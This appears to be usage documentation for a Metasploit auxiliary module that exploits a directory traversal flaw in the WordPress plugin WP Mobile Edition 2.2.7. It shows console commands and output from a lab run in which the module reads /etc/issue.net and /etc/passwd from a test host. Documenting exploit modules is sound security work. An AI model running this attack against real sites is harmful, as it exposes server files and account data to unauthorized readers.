#### Add Wordpress Plugin Mobile Edition File Read Vulnerability.

  Application: Wordpress Plugin 'WP Mobile Edition' 2.2.7
  Homepage: https://wordpress.org/plugins/wp-mobile-edition/
  Source Code: https://downloads.wordpress.org/plugin/wp-mobile-edition.2.2.7.zip
  Active Installs (wordpress.org): 5,000+
  References: https://wpvulndb.com/vulnerabilities/7896

#### Vulnerable packages*
        
  2.2.7
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msf > use auxiliary/scanner/http/wp_mobileedition_file_read 
msf auxiliary(wp_mobileedition_file_read) > show options 

Module options (auxiliary/scanner/http/wp_mobileedition_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /wordpress/      yes       The URI path to the web application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_mobileedition_file_read) > info

       Name: WordPress Mobile Edition File Read Vulnerability
     Module: auxiliary/scanner/http/wp_mobileedition_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Khwanchai Kaewyos
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DEPTH      6                yes       Traversal Depth (to reach the root folder)
  FILEPATH   /etc/passwd      yes       The path to the file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /wordpress/      yes       The URI path to the web application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in 
  WordPress Plugin "WP Mobile Edition" version 2.2.7, allowing to read 
  arbitrary files with the web server privileges. Stay tuned to the 
  correct value in TARGETURI.

References:
  http://www.exploit-db.com/exploits/36733
  https://wpvulndb.com/vulnerabilities/7898

msf auxiliary(wp_mobileedition_file_read) > set RHOSTS 192.168.1.31
RHOSTS => 192.168.1.31
msf auxiliary(wp_mobileedition_file_read) > set TARGETURI /
TARGETURI => /
msf auxiliary(wp_mobileedition_file_read) > set FILEPATH /etc/issue.net
FILEPATH => /etc/issue.net
msf auxiliary(wp_mobileedition_file_read) > run

[*] Downloading file...

Ubuntu 12.04.5 LTS

[+] 192.168.1.31:80 - File saved in: /home/espreto/.msf4/loot/20150415194241_default_192.168.1.31_rips.traversal_917781.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_mobileedition_file_read) > set FILEPATH /etc/passwd 
FILEPATH => /etc/passwd
msf auxiliary(wp_mobileedition_file_read) > run

[*] Downloading file...

root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemessagebus:x:102:105::/var/run/dbus:/bin/falsecolord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/falselightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/falsewhoopsie:x:105:114::/nonexistent:/bin/falseavahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falseavahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falseusbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/falsekernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/falsepulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/falsertkit:x:111:122:RealtimeKit,,,:/proc:/bin/falsespeech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/shhplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/falsesaned:x:114:123::/home/saned:/bin/falseespreto:x:1000:1000:espreto,,,:/home/espreto:/bin/bashvboxadd:x:999:1::/var/run/vboxadd:/bin/falsepostgres:x:115:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bashmysql:x:116:126:MySQL Server,,,:/nonexistent:/bin/false

[+] 192.168.1.31:80 - File saved in: /home/espreto/.msf4/loot/20150415194300_default_192.168.1.31_rips.traversal_700451.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_mobileedition_file_read) >

```
